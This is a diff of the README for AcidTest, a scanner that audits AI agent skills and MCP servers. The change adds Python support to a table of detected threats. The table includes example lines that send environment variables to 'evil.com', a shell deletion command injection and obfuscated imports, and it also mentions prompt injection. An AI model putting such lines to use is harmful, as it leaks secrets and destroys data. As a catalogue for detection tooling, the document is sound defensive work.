@@ -54,7 +54,7 @@ npx acidtest scan ./my-skill
 npx acidtest scan ./my-mcp-server
 ```
 
-No API keys. No configuration. No Python.
+No API keys. No configuration. Works with TypeScript and Python.
 
 ## Example Output
 ```
@@ -88,15 +88,17 @@ RECOMMENDATION: Do not install. Prompt injection attempt detected.
 
 ## What AcidTest Catches
 
-| Threat | Example | Detection Method |
-|--------|---------|------------------|
-| **Arbitrary Code Execution** | `eval(userInput)`, `new Function()` | AST analysis + pattern matching |
-| **Data Exfiltration** | `fetch('evil.com', {body: process.env})` | Cross-reference layer |
-| **Hardcoded Credentials** | `apiKey = "sk_live_..."` | Pattern matching + entropy |
-| **Prompt Injection** | Markdown instruction override | Injection detection layer |
-| **Obfuscation** | Base64/hex encoded payloads | Shannon entropy analysis |
-| **Supply Chain Attacks** | `require('child_' + 'process')` | AST bypass detection |
-| **Permission Escalation** | Undeclared network/filesystem access | Permission audit + crossref |
+| Threat | TypeScript Example | Python Example | Detection Method |
+|--------|-------------------|----------------|------------------|
+| **Arbitrary Code Execution** | `eval(userInput)`, `new Function()` | `eval(user_input)`, `exec(code)` | AST analysis + pattern matching |
+| **Command Injection** | `exec('rm -rf ' + dir)` | `subprocess.run(cmd, shell=True)` | AST analysis + pattern matching |
+| **Unsafe Deserialization** | N/A | `pickle.loads(data)` | AST analysis + pattern matching |
+| **Data Exfiltration** | `fetch('evil.com', {body: process.env})` | `requests.post('evil.com', data=os.environ)` | Cross-reference layer |
+| **Hardcoded Credentials** | `apiKey = "sk_live_..."` | `API_KEY = "sk_live_..."` | Pattern matching + entropy |
+| **Prompt Injection** | Markdown instruction override | Markdown instruction override | Injection detection layer |
+| **Obfuscation** | Base64/hex encoded payloads | Base64/hex encoded payloads | Shannon entropy analysis |
+| **Supply Chain Attacks** | `require('child_' + 'process')` | `__import__(module_name)` | AST bypass detection |
+| **Permission Escalation** | Undeclared network/filesystem access | Undeclared network/filesystem access | Permission audit + crossref |
 
 **What AcidTest Doesn't Catch:**
 - Zero-day exploits in Node.js itself
@@ -111,12 +113,18 @@ See [METHODOLOGY.md](./METHODOLOGY.md) for full transparency on capabilities and
 AcidTest runs four analysis layers:
 1. **Permission Audit**: Analyzes declared permissions (bins, env, tools)
 2. **Prompt Injection Scan**: Detects instruction override attempts (AgentSkills)
-3. **Code Analysis**: AST-based analysis + Shannon entropy detection for obfuscation
+3. **Code Analysis**: Multi-language AST analysis + Shannon entropy detection for obfuscation
 4. **Cross-Reference**: Catches code behavior not matching declared permissions
 
+**Language Support:**
+- **TypeScript/JavaScript**: Full AST analysis with 48 security patterns
+- **Python**: Full AST analysis with 31 Python-specific patterns (tree-sitter based)
+- Detects eval/exec, subprocess injection, unsafe deserialization, and more
+
 **Advanced Features:**
+- Total 79 security patterns across both languages
 - Entropy analysis detects base64/hex encoding and obfuscated strings
-- Pattern-based detection with 48 security patterns
+- Context-aware detection (shell=True, SafeLoader, etc.)
 - CI/CD integration via GitHub Actions and pre-commit hooks
 
 Works with both SKILL.md (AgentSkills) and MCP manifests (mcp.json, server.json, package.json).
